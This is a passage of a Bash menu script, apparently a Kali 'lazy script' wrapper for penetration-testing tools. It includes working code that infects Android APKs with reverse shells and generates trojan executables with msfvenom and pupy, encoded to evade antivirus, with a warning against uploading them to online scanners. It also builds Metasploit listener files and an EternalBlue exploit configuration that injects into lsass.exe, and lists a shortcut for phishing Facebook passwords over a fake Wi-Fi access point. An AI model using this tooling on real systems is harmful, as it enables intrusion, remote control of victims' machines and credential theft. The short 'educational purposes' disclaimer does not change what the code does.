					APKPERM="yes"
				fi
				echo -e ""$YS" 1"$CE") Apk to infect                      CURRENT:$APK"
				echo -e ""$YS" 2"$CE") LHOST                              CURRENT:$APKLH"
				echo -e ""$YS" 3"$CE") LPORT                              CURRENT:$APKLP"
				echo -e ""$YS" 4"$CE") Protocol                           CURRENT:$APKPROT"
				echo -e ""$YS" 5"$CE") Add additional permissions         CURRENT:$APKPERM"
				echo -e ""$YS" b"$CE") Go back"
				echo -e ""$YS" run"$CE") Infect apk"
				echo -e "Choose: "
				read APKK
				clear
				if [[ "$APKK" = 1 ]]
				then
					echo -e "Apk to infect(must be in /root/kwetza): "
					read APKTBI
					if [[ -f "$APKTBI" ]]
					then
						APK="$APKTBI"
					else
						echo -e ""$RS"/root/kwetza/"$APKTBI" not found"$CE""
						sleep 3
					fi
				elif [[ "$APKK" = 2 ]]
				then
					echo -e "LHOST: "
					read APKLH
				elif [[ "$APKK" = 3 ]]
				then
					echo -e "LPORT: "
					read APKLP
				elif [[ "$APKK" = 4 ]]
				then
					if [[ "$APKPROT" = "tcp" ]]
					then
						APKPROT="https"
					else
						APKPROT="tcp"
					fi
				elif [[ "$APKK" = 5 ]]
				then
					if [[ "$APKPERM" = "yes" ]]
					then
						APKPERM="no"
					else
						APKPERM="yes"
					fi
				elif [[ "$APKK" = "back" || "$APKK" = "b" ]]
				then
					break
				elif [[ "$APKK" = "run" ]]
				then
					if [[ "$APK" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"No apk specified."$CE""
						sleep 3
						continue
					fi
					if [[ "$APKLH" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"No LHOST specified."$CE""
						sleep 3
						continue
					fi
					if [[ "$APKLP" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"No LPORT specified."$CE""
						sleep 3
						continue
					fi
					cd /root/kwetza
					python kwetza.py $APK $APKLH $APKPROT $APKLP $APKPERM
					echo -e "$PAKTGB"
					$READAK
				fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_kwetza
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "7" ]]
	then
		if [[ -f /usr/bin/shellter ]]
		then
			shellter
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_shellter
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "2" ]]
	then
		if [[ -d /root/ezsploit ]]
		then
			cd /root/ezsploit/
			./ezsploit.sh
			cd
			echo -e "Go to metasploit menu to create a listener(Option "$YS"14"$CE")"
			sleep 2
			echo -e "Press "$YS"any key"$CE" to leave..."
			$READAK
			exec bash "$0"
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_ezsploit
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "3" ]]
	then
		if [[ -d /root/pupy ]]
		then
			while true
			do
			clear
			echo -e ""$YS" 1"$CE") Generate a payload"
			echo -e ""$YS" 2"$CE") Start listener"
			echo -e ""$YS" b"$CE") Go back"
			echo -e ""$YS"00"$CE") Main menu"
			echo -e ""$YS" 0"$CE") EXIT"
			read -e PUPY
			if [[ "$PUPY" = "1" ]]
			then
				clear
				echo -e "Choose the target OS:"
				echo -e ""$YS" 1"$CE") Windows"
				echo -e ""$YS" 2"$CE") Linux"
				echo -e ""$YS" 3"$CE") Android"
				echo -e "Choose: "
				read -e TAROS
				if [[ "$TAROS" = "1" ]]
				then
					TAROS="windows"
				elif [[ "$TAROS" = "2" ]]
				then
					TAROS="linux"
				elif [[ "$TAROS" = "3" ]]
				then
					TAROS="android"
				else
					echo -e "Wrong choice.Returning to main manu..."
					sleep 2
					exec bash "$0"
				fi
				clear
				echo -e "Enter your ip: "
				read -e PUPYIP
				clear
				echo -e "Enter your port(e.g: 443): "
				read -e PUPYPORT
				clear
				echo -e "Enter the full output path(e.g: /root/Desktop/payload1.exe)"
				read -e PUPYPATH
				cd /root/pupy/pupy
				./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
				cd
			elif [[ "$PUPY" = "2" ]]
			then
				cd /root/pupy/pupy
				./pupysh.py
			elif [[ "$PUPY" = "00" ]]
			then
				exec bash "$0"
			elif [[ "$PUPY" = "back" || "$PUPY" = "b" ]]
			then
				break
			elif [[ "$PUPY" = "0" ]]
			then
				exit
			fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_pupy
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "4" ]]
	then
		if [[ -d /root/zirikatu ]]
		then
			clear
			echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
			sleep 3
			echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
			read MUSTBEYES
			if [[ "$MUSTBEYES" = "YES" ]] 
			then 
				clear
				cd /root/zirikatu
				./zirikatu.sh
				cd
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_zirikatu
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "5" ]]
	then
		if [[ -d /root/TheFatRat ]]
		then
			fatrat
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_thefatrat
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "6" ]]
	then
		if [[ -d /root/Winpayloads ]]
		then
			cd /root/Winpayloads
			./WinPayloads.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_winpayloads
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$KEYLOG" = "0" ]]
	then
		clear
		exit
	elif [[ "$KEYLOG" = "back" || "$KEYLOG" = "b" ]]
	then
		break
	fi
	echo -e "$PAKTGB"
	$READAK
	done
}
function information_gathering
{
	while true 
	do
		clear
		TERMINALTITLE="INFORMATION GATHERING"
		dash_calc
		printf '\033]2;INFORMATION GATHERING\a'
		if [[ -d /usr/share/sniper ]]
		then
			echo -e ""$YS" 1"$CE") Sniper"
		else
			echo -e ""$RS" 1"$CE") "$RS"Sniper"$CE""
		fi
		if [[ -d /root/ReconDog ]]
		then
			echo -e ""$YS" 2"$CE") ReconDog"
		else
			echo -e ""$RS" 2"$CE") "$RS"ReconDog"$CE""
		fi
		if [[ -d /root/RED_HAWK ]]
		then
			echo -e ""$YS" 3"$CE") RED HAWK"
		else
			echo -e ""$RS" 3"$CE") "$RS"RED HAWK"$CE""
		fi
		if [[ -d /root/Infoga ]]
		then
			echo -e ""$YS" 4"$CE") Infoga"
		else
			echo -e ""$RS" 4"$CE") "$RS"Infoga"$CE""
		fi
		if [[ -d /root/KnockMail ]]
		then
			echo -e ""$YS" 5"$CE") KnockMail"
		else
			echo -e ""$RS" 5"$CE") "$RS"KnockMail"$CE""
		fi
		if [[ -d /root/operative-framework ]]
		then
			echo -e ""$YS" 6"$CE") Operative-framework"
		else
			echo -e ""$RS" 6"$CE") "$RS"Operative-framework"$CE""
		fi
		echo -e ""$YS" b"$CE") Go back"
		echo -e ""$YS"00"$CE") Main menu"
		echo -e "Choose: "
		read INFOG
		clear
		if [[ "$INFOG" = 1 ]]
		then
			if [[ -d /usr/share/sniper ]]
			then
				echo -e "Enter the domain you want to scan: "
				read DOMAIN
				clear
				sniper $DOMAIN
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_sniper
				else
					continue
				fi
			fi
		elif [[ "$INFOG" = 2 ]]
		then
			if [[ -d /root/ReconDog ]]
			then
				cd /root/ReconDog
				python dog.py
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_recondog
				else
					continue
				fi
			fi
		elif [[ "$INFOG" = 3 ]]
		then
			if [[ -d /root/RED_HAWK ]]
			then
				cd /root/RED_HAWK
				php rhawk.php
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_redhawk
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 4 ]]
		then
			if [[ -d /root/Infoga ]]
			then
				echo -e "Domain to search:"
				read INFOTARG
				echo -e "Data source(e.g. "$YS"all"$CE","$YS"google"$CE","$YS"bing"$CE","$YS"yahoo"$CE","$YS"pgp"$CE"): "
				read INFOSOUR
				clear
				cd /root/Infoga
				python infoga.py -t $INFOTARG -s $INFOSOUR 
				echo -e "$PAKTGB"
				$READAK
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_infoga
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 5 ]]
		then
			if [[ -d /root/KnockMail ]]
			then
				clear
				cd /root/KnockMail
				python2.7 knock.py
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_knockmail
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 6 ]]
		then
			if [[ -d /root/operative-framework ]]
			then
				clear
				cd /root/operative-framework
				python2.7 operative.py
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_operative
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 0 ]]
		then
			exit
		elif [[ "$INFOG" = 00 ]]
		then
			exec bash $0
		elif [[ "$INFOG" = "back" || "$INFOG" = "b" ]]
		then
			break
		fi
		echo -e "$PAKTGB"
		$READAK
	done
}
function other_tools
{
while true
do
	printf '\033]2;OTHER TOOLS\a'
	clear
	TERMINALTITLE="OTHER TOOLS"
	dash_calc
	if [[ -f /usr/bin/geany ]]
	then
		echo -e ""$YS" 1"$CE") Geany            Best notepad for linux"
	else
		echo -e ""$RS" 1"$CE") "$RS"Geany"$CE"            Best notepad for linux"
	fi
	if [[ -d /root/dagon ]]
	then
		echo -e ""$YS" 2"$CE") Dagon            Hash cracker/Advanced Hash Manipulation"
	else
		echo -e ""$RS" 2"$CE") "$RS"Dagon"$CE"            Hash cracker/Advanced Hash Manipulation"
	fi
	if [[ -d /root/LALIN ]]
	then
		echo -e ""$YS" 3"$CE") LALIN            Automatically install any package for pentest "
	else
		echo -e ""$RS" 3"$CE") "$RS"LALIN"$CE"            Automatically install any package for pentest "
	fi
	if [[ -d /root/cupp ]]
	then
		echo -e ""$YS" 4"$CE") Cupp             Make specific worldlists"
	else
		echo -e ""$RS" 4"$CE") "$RS"Cupp"$CE"             Make specific worldlists"
	fi
	if [[ -d /root/cupp ]]
	then
		echo -e ""$YS" 5"$CE") Bleachbit        Free up space"
	else
		echo -e ""$RS" 5"$CE") "$RS"Bleachbit"$CE"        Free up space"
	fi
	if [[ -d /root/Hash-Buster ]]
	then
		echo -e ""$YS" 6"$CE") Hash Buster      Hash cracker"
	else
		echo -e ""$RS" 6"$CE") "$RS"Hash Buster"$CE"      Hash cracker"
	fi
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e OTHERT
	clear
	if [[ "$OTHERT" = 1 ]]
	then
		if [[ -f /usr/bin/geany ]]
		then
			geany
		else
			echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_geany
				else
					continue
				fi

		fi
	elif [[ "$OTHERT" = 2 ]]
	then
		if [[ -d /root/dagon ]]
		then
			dagon_script
		else
			echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_dagon
				else
					continue
				fi

		fi
	elif [[ "$OTHERT" = 3 ]]
	then
		if [[ -d /root/LALIN ]]
		then
			cd /root/LALIN
			./Lalin.sh
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_lalin
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = "4" ]]
	then
		if [[ -d "/root/cupp" ]]
		then
			cd /root/cupp
			python cupp.py -i
			cd		
			echo -e "$PAKTGB"
			$READAK	
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_cupp
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = "5" ]]
	then
		if [[ -f "/usr/bin/bleachbit" ]]
		then
			bleachbit		
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_bleachbit
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = "6" ]]
	then
		if [[ -d "/root/Hash-Buster" ]]
		then
			cd /root/Hash-Buster
			python hash.py	
			echo -e "$PAKTGB"
			$READAK	
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_hashbuster
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = 00 ]]
	then
		clear
		exec bash $0
	elif [[ "$OTHERT" = "back" || "$OTHERT" = "b" ]]
	then
		break
	elif [[ "$OTHERT" = 0 ]]
	then
		clear
		exit
	fi
done
}
function findsploit_menu
{
	clear
	echo -e "Search: "
	read FSEARCH
	findsploit "$FSEARCH"
	echo -e "$PAKTGB"
	$READAK
}
function metasploit_menu
{
	if [[ ! -d "$LPATH"/rc ]]
	then
		mkdir "$LPATH"/rc
	fi
	while true
	do
	clear
	TERMINALTITLE="METASPLOIT"
	dash_calc
	printf '\033]2;METASPLOIT\a'
	echo -e ""$YS" 1"$CE") Create payload with msfvenom"
	echo -e ""$YS" 2"$CE") Create listener"
	echo -e ""$YS" 3"$CE") Saved listeners"
	echo -e ""$YS" 4"$CE") Start msfconsole"
	echo -e ""$YS" 5"$CE") Update msfconsole"
	echo -e ""$YS" 6"$CE") Armitage"
	echo -e ""$YS" 7"$CE") Findsploit"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e METASP
	clear
	if [[ "$METASP" = "1" ]]
	then
		PAYLOADL=""
		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
		read PAYLOADL
		if [[ -z "$PAYLOADL" ]]
		then
			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
			sleep 2
			PAYLOADL="windows/meterpreter/reverse_tcp"
		fi
		echo -e "LHOST: "
		read ATIP
		echo -e ""
		echo -e "LPORT: "
		read ATPORT
		echo -e ""
		echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
		read TARCH
		echo -e "Enter the name of the payload(e.g: "$YS"trojan2"$CE"): "
		read ATEXE
		ATEXEPATH="/root/Desktop/$ATEXE.exe"
		clear
		echo -e "Generating"
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		if [[ "$TARCH" = "x64" ]]
		then
			msfvenom -p $PAYLOADL --platform windows -a x64 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
		else
			msfvenom -p $PAYLOADL --platform windows -a x86 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
		fi
		echo -e "Done."
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		clear
		echo -e "Create a listener for this payload? $YNYES "
		read PAYL
		if [[ "$PAYL" != "n" ]]
		then
			echo -e "Name of listener(e.g: "$YS"john"$CE") : "
			read NAMEL
			echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
			echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set LHOST $ATIP " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set LPORT $ATPORT " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
			echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
			clear
			echo -e "Launch the listener now? "$YNONLY""
			read LLN
			if [[ "$LLN" = "y" ]]
			then
				echo -e "Launching msfconsole..."
				sleep 2
				clear
				msfconsole -r "$LPATH"/rc/"$NAMEL".rc
			fi
		fi
	elif [[ "$METASP" = "z" ]]
	then
		clear
		echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
		sleep 3
		echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
		read MUSTBEYES
		if [[ "$MUSTBEYES" = "YES" ]] 
		then 
			clear
			cd /root/zirikatu
			./zirikatu.sh
		fi
	elif [[ "$METASP" = "2" ]]
	then
		clear
		echo -e "LHOST: "
		read LHOSTL
		echo -e "LPORT: "
		read LPORTL
		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
		read PAYLOADL
		if [[ -z "$PAYLOADL" ]]
		then
			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
			sleep 2
			PAYLOADL="windows/meterpreter/reverse_tcp"
		fi
		echo -e "Name of listener(e.g: "$YS"john"$CE") : "
		read NAMEL
		echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
		echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set LHOST $LHOSTL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set LPORT $LPORTL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
		echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
		clear
		echo -e "Launch the listener now? "$YNONLY""
		read LLN
		if [[ "$LLN" = "y" ]]
		then
			echo -e "Launching msfconsole..."
			sleep 2
			clear
			msfconsole -r "$LPATH"/rc/"$NAMEL".rc
		fi
	elif [[ "$METASP" = "3" ]]
	then
		while true
		do
		clear
		ls -w 1 "$LPATH"/rc
		echo -e ""
		echo -e ""
		echo -e "Enter the name of the listener you want to select(e.g: "$YS"john"$CE")"
		echo -e ""$YS" r"$CE") Delete all saved listeners"
		echo -e ""$YS" b"$CE") Go back"
		read NAMERC
		clear
		if [[ "$NAMERC" = "back" || "$NAMERC" = "b" ]]
		then
			break
		elif [[ "$NAMERC" = "reset" || "$NAMERC" = "r" ]]
		then
			rm -f "$LPATH"/rc/*
			continue
		fi
		if [[ ! -f "$LPATH"/rc/"$NAMERC" ]]
		then
			NAMERC="$NAMERC".rc
			if [[ ! -f "$LPATH"/rc/"$NAMERC" ]]
			then
				echo -e "File not found. Try again.."
				sleep 2
				continue
			fi
		fi
		while true
		do
		clear
		echo -e ""$NAMERC" selected."
		echo -e ""$YS" 1"$CE") Start listener"
		echo -e ""$YS" 2"$CE") Delete listener"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read LISTL
		if [[ "$LISTL" = "1" ]]
		then
			msfconsole -r "$LPATH"/rc/"$NAMERC"
		elif [[ "$LISTL" = "2" ]]
		then
			rm "$LPATH"/rc/"$NAMERC"
			break
		elif [[ "$LISTL" = "back" || "$LISTL" = "b" ]]
		then
			break
		fi
		done
		done
	elif [[ "$METASP" = "4" ]]
	then
		msfconsole
	elif [[ "$METASP" = "5" ]]
	then
		msfupdate
	elif [[ "$METASP" = "6" ]]
	then
		service postgresql start
		armitage
		clear
	elif [[ "$METASP" = "7" ]]
	then
		findsploit_menu
	elif [[ "$METASP" = "back" || "$METASP" = "b" ]]
	then
		BACKL="1"
		break
	elif [[ "$METASP" = "00" ]]
	then
		exec bash "$0"
	elif [[ "$METASP" = "0" ]]
	then
		clear
		exit
	fi
	done
}
function update_brscript
{
	echo -e "Checking for updates..."
	TESTINTERNETCONNECTION=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
	if [[ "$TESTINTERNETCONNECTION" != "" ]]
	then
		VER=$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/arismelachroinos/lscript/master/version.txt" 2>/dev/null)
		if [[ "$VERSION" != "$VER" ]]
		then
			clear
			echo -e "There is an update available."
			echo -e "Current version: $VERSION"
			echo -e "Updated version: $VER"
			echo -e "$PAKTC"
			$READAK
			clear
			echo -e "Do you want to update?"$YNONLY": "
			read UPDATEYN
			if [[ "$UPDATEYN" = "y" ]]
			then
				clear
				#~ echo -e "Making new directory for the old brscript (will pass it to /root/brscriptold)"
				sleep 1
				if [[ -d /root/brscriptold ]]
				then
					rm -r /root/brscriptold
				fi
				mkdir /root/brscriptold
				echo -e ""
				#~ echo -e "Moving brscript to brscriptold"
				sleep 1
				mv "$LPATH" /root/brscriptold
				#~ echo -e "Cloning the latest github version to new "$LPATH""
				sleep 1
				cd
				git clone https://github.com/arismelachroinos/lscript.git
				cd "$LPATH"
				chmod +x install.sh
				clear
				sleep 1
				if [[ -f /root/brscriptold/brscript/IAGREE.txt ]]
				then
					cp /root/brscriptold/brscript/IAGREE.txt "$LPATH"
				fi
				if [[ -d /root/brscriptold/brscript/ks ]]
				then
					echo -e "Copying your shortcuts"
					cp -r /root/brscriptold/brscript/ks "$LPATH"
					echo -e "Done."
					sleep 0.2
				fi
				if [[ -d /root/brscriptold/brscript/settings ]]
				then
					echo -e "Copying your settings"
					cp -r /root/brscriptold/brscript/settings "$LPATH"
					echo -e "Done."
					sleep 0.2
				fi
				if [[ -f /root/brscriptold/brscript/wlanmon.txt ]]
				then
					echo -e "Copying your interfaces"
					cp /root/brscriptold/brscript/wlanmon.txt "$LPATH"
					echo -e "Done."
					sleep 0.2
				fi
				echo -e ""
				if [[ -f /root/brscriptold/brscript/wlan.txt ]]
				then
					cp /root/brscriptold/brscript/wlan.txt "$LPATH"
					echo -e "Done."
					sleep 0.2
					clear
				fi
				echo -e "$PAKTC"
				$READAK
				cd "$LPATH"
				gnome-terminal -e ./install.sh
				clear 
				sleep 1
				rm -rf /root/brscriptold
				echo -e "Exiting..."
				sleep 1
				kill -9 $PPID
			else 
				clear
				echo -e "You didnt select "y" so you go back..."
				sleep 3
				exec bash "$0"
			fi
		else
			echo -e "There is no update available"
			sleep 1
			echo -e "Installed version: $VERSION"
			sleep 1
			echo -e "Github version:    $VER"
			sleep 1
			echo -e "$PAKTGB"
			$READAK	
			exec bash "$0"
		fi
	else
		clear
		echo -e "There is no connection."
		sleep 1
		echo -e "Maybe you should type 'stop' in the main manu to gain internet access again"
		echo -e ""
		echo -e "$PAKTGB"
		$READAK
		exec bash "$0"
	fi	
}
function hidden_shortcuts
{
	clear
	TERMINALTITLE="HIDDEN SHORTCUTS"
	dash_calc
	printf '\033]2;HIDDEN SHORTCUTS\a'
	echo -e ""$YS"  interface"$CE") Change your interface"
	echo -e ""$YS"     wififb"$CE") Create open wifi access point and get fb passwords with wifiphisher"
	echo -e ""$YS"eternalblue"$CE") Launch msfconsole with eternalblue exploit on target"
	echo -e ""$YS"  etercheck"$CE") Check if a target is vulnerable to eternalblue exploit"
	echo -e ""$YS"  changelog"$CE") View the changelog of the brscript versions"
	echo -e ""$YS"     pstart"$CE") Service postgresql start"
	echo -e ""$YS"      pstop"$CE") Service postgresql stop"
	echo -e ""$YS"     nstart"$CE") Service network-manager start"
	echo -e ""$YS"      nstop"$CE") Service network-manager stop"
	echo -e ""$YS"     astart"$CE") Service apache2 start"
	echo -e ""$YS"      astop"$CE") Service apache2 stop"
	echo -e ""$YS"nessusstart"$CE") Start Nessus"
	echo -e ""$YS" nessusstop"$CE") Stop Nessus"
	echo -e ""$YS"         00"$CE") Go to main menu"
	echo -e "$PAKTGB"
	$READAK
	clear
}
function one_time_per_launch_ks
{
	if [[ -d ""$KSPATH"/nums" ]]
	then
		rm -r "$KSPATH"/nums
	fi
	mkdir "$KSPATH"/nums
	nn=1
	ff=1
	HOWMANY=0
	HOWADD=$(( HOWMANYTOOLS + 1 )) 
	while [[ "$nn" != "$HOWADD" ]]
	do
		listshortcuts
		if [[ -f ""$KSPATH"/"$TITLE"/"$TITLE"ks.txt" ]]
		then
				echo -e "$TITLE" > "$KSPATH"/nums/"$ff".txt
				ff=$(( ff+1 ))
				HOWMANY=$(( HOWMANY+1 ))		
		fi
		nn=$(( nn+1 ))

	done
	ONETIMEPERLAUNCH="1"
}
function interface_menu
{
	WLANN=$(cat "$LPATH"/wlan.txt)
	WLANNM=$(cat "$LPATH"/wlanmon.txt)
	echo -e "Your current wireless interface names are $WLANN and $WLANNM"
	sleep 2
	echo -e "Do you want to change you interface names?"$YNYES": "
	read INAG
	if [[ "$INAG" = "n" ]]
	then
		clear
		echo -e "Then why did you come here? lol"
		sleep 3
		exec bash "$0"
	else
		clear
		rm "$LPATH"/wlan.txt
		rm "$LPATH"/wlanmon.txt
		set_interface_number
	fi
}
function tools_menu
{
	while true
	do
	clear
	TERMINALTITLE="TOOLS"
	dash_calc
	printf '\033]2;TOOLS\a'
	echo -e ""$YS" 1"$CE") Wifi tools"
	echo -e ""$YS" 2"$CE") Remote access"
	echo -e ""$YS" 3"$CE") Information gathering"
	echo -e ""$YS" 4"$CE") Others"
	echo -e ""$YS" 5"$CE") Install/reinstall a tool"
	echo -e ""$YS" i"$CE") Info"
	echo -e ""$YS" b"$CE") Go back"
	#~ echo -e ""$YS"00"$CE") Main menu"
	echo -e ""$YS" 0"$CE") EXIT"
	echo "Choose: "
	read -e CATEG
	clear
		if [[ "$CATEG" = "1" ]]
		then
			wifi_tools
		elif [[ "$CATEG" = "2" ]]
		then
			remote_access
		elif [[ "$CATEG" = "3" ]]
		then
			information_gathering
		elif [[ "$CATEG" = "4" ]]
		then
			other_tools
		elif [[ "$CATEG" = "5" ]]
		then
			reinstall_tools
		elif [[ "$CATEG" = "0" ]]
		then
			clear
			exit
		elif [[ "$CATEG" = "back" || "$CATEG" = "b" || "$CATEG" = 00 ]]
		then
			BACKL="1"
			break
		elif [[ "$CATEG" = "i" ]]
		then
			TERMINALTITLE="INFO"
			dash_calc
			printf '\033]2;INFO\a'
			echo -e ""$LGYS"Wifi tools:"
			echo -e "	Mostly focused on network attacks, MITM, DoS, evil-twin and phishing."
			echo -e "Remote access:"
			echo -e "	Mostly focused on payload generation, listeners, exploits, scanners"
			echo -e "	and bypassing anti-virus software."
			echo -e "Information gathering:"
			echo -e "	Self-explained."
			echo -e "Other tools:"
			echo -e "	Some very usefull tools that don't fit to the other categories."
			echo -e "Install/reinstall a tool:"
			echo -e "	From here you can install any tool available in the lazy script."
			echo -e "	If it is already installed, it will be deleted and reistalled."$CE""
			echo -e ""
			echo -e ""$BS"Do you want another tool to be added in the script?"$CE""
			echo -e ""$BS"Submit it as an issue on my github repo:"$CE""
			echo -e "	"$YS"https://github.com/arismelachroinos/lscript"$CE""
			echo -e ""
			echo -e ""
			echo -e "$PAKTGB"
			$READAK
		fi
	done
}
function public_ip
{
	clear
	CHECKMON=$(ifconfig | grep "mon")
	if [[ "$CHECKMON" = "" ]]
	then
		PUBLICIP=$(curl -s ipinfo.io/ip)
		if [[ "$PUBLICIP" = "" ]]
		then
			PUBLICIP=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
			if [[ "$PUBLICIP" = "" ]]
			then
				PUBLICIP="Connection error."
			fi
		fi
		echo "Your public IP is: "$PUBLICIP""
		#~ curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
	else
		echo -e "When monitor mode is enabled, you don't have internet access."
		echo -e "Select 'd2' to disable monitor mode"
		echo -e "$PAKTGB"
		$READAK
		clear
		exec bash "$0"
	fi
}
function terms_of_use
{
	printf '\033]2;TERMS OF USE\a'
	clear
	echo -e ""$RS"You need to accept the terms."$CE""
	sleep 1
	echo -e "$PAKTC"
	$READAK
	clear
	echo -e "This tool is only for educational purposes only."
	echo -e "Use this tool only on your own network and never without permission."
	echo -e "I am not responsible for anything you do with this tool."
	echo -e "Will you use this tool only on your own network and only with your own responsibility?("$YS"YES"$CE"/"$YS"NO"$CE"): "
	read YESORNO
	if [[ "$YESORNO" = "YES" ]]
	then 
		echo "You have agreed the terms and you use this tool with your own responsibility." > "$LPATH"/IAGREE.txt
		sleep 1
		clear
	else
		echo -e "You didn't type 'YES' , so you cannot continue"
		sleep 4
	fi
	exec bash "$0"
}
function eternalblue
{
	if [[ ! -d "$LPATH"/rce ]]
	then
		mkdir	"$LPATH"/rce
	fi
	echo -e "LHOST: "
	read LHOSTL
	echo -e "RHOST: "
	read RHOSTL
	echo -e "TARGETARCHITECTURE("$YS"x86"$CE"/"$YS"x64"$CE"): "
	read TARGETARCHL
	if [[ "$TARGETARCHL" = "x64" ]]
	then
		PROCESSINJECTL="lsass.exe"
		PAYLOADL="windows/x64/meterpreter/reverse_tcp"
	else
		PAYLOADL="windows/meterpreter/reverse_tcp"
	fi
	echo -e "TARGET("$YS"0"$CE"-"$YS"8"$CE"): "
	read TARGETL
	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$LPATH"/rce/eternalbluerc.rc
	echo "set LHOST "$LHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOST "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PAYLOAD "$PAYLOADL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set TARGET "$TARGETL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set TARGETARCHITECTURE "$TARGETARCHL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PROCESSINJECT "$PROCESSINJECTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "show info" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit -j" >> "$LPATH"/rce/eternalbluerc.rc
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}
function eternalblue_check
{
	if [[ ! -d "$LPATH"/rce ]]
	then
		mkdir	"$LPATH"/rce
